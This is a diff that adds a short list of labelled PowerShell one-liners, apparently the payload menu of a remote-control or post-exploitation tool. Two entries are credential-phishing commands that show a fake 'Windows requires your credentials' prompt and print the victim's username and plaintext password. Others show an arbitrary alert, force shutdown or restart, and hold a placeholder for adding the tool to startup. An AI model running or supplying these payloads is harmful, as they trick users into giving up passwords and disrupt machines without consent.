@@ -1,0 +1,7 @@
+Windows PSv3+ Phish:powershell "Get-Credential -User $(whoami).Split('\')[1] -Message 'Windows requires your credentials to continue' | % {Write-Host $_.UserName '->' $_.GetNetworkCredential().password}"
+Windows PSv2- Phish:powershell "Get-Credential | % {Write-Host $_.UserName '->' $_.GetNetworkCredential().password}"
+Windows Alert:powershell "[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('Message', 'Title')"
+Get PS Version:powershell "$PSVersionTable"
+Shutdown:powershell "Stop-Computer"
+Restart:powershell "Restart-Computer"
+Add self to system startup:tba
